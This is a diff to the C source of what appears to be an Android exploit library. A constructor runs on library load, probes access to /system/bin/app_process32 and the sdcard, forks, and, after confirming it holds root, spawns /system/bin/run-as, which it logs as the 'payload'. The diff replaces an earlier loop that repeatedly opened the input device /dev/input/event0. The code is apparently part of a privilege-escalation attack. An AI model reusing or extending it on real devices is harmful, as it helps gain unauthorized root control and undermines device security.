@@ -26,8 +26,28 @@ typedef int setcon_t(const char *con);
 
 __attribute__((constructor)) void say_hello()
 {
-
   LOGV("%d: hi (%d)", getpid(), getuid());
+  int fd1 = open("/system/bin/app_process32", O_RDONLY);
+  if (fd1 == -1)
+  {
+    LOGV("Unable to open real app_process32: %s!", strerror(errno));
+  }
+  else
+  {
+    LOGV("Open real app_process32 successfully!");
+    close(fd1);
+  }
+
+  fd1 = open("/sdcard/test", O_RDWR);
+  if (fd1 == -1)
+  {
+    LOGV("Unable to open sdcard: %s!", strerror(errno));
+  }
+  else
+  {
+    LOGV("Open sdcard successfully!");
+    close(fd1);
+  }
 
   int orig_pid = getpid();
   pid_t pid = fork();
@@ -110,28 +130,14 @@ __attribute__((constructor)) void say_hello()
     if (getuid() == 0)
     {
       LOGV("Got root");
-      if (daemon(0, 0) == -1)
-      {
-        LOGV("Unable to daemonize process: %s!", strerror(errno));
-      }
-
-      while (1)
-      {
-        int fd;
-        if ((fd = open("/dev/input/event0", O_RDONLY)) == -1)
+      if (!fork()) {
+        if (execl("/system/bin/run-as", "/system/bin/run-as", NULL))
         {
-          LOGV("Unable to open input device: %s", strerror(errno));
-          break;
+          LOGV("Unable to exec payload: %s!", strerror(errno));
         }
-        else
-        {
-          LOGV("%d: Open input device success!", orig_pid);
-          close(fd);
-        }
-
-        sleep(1);
       }
     }
+
     exit(0);
   }
 }
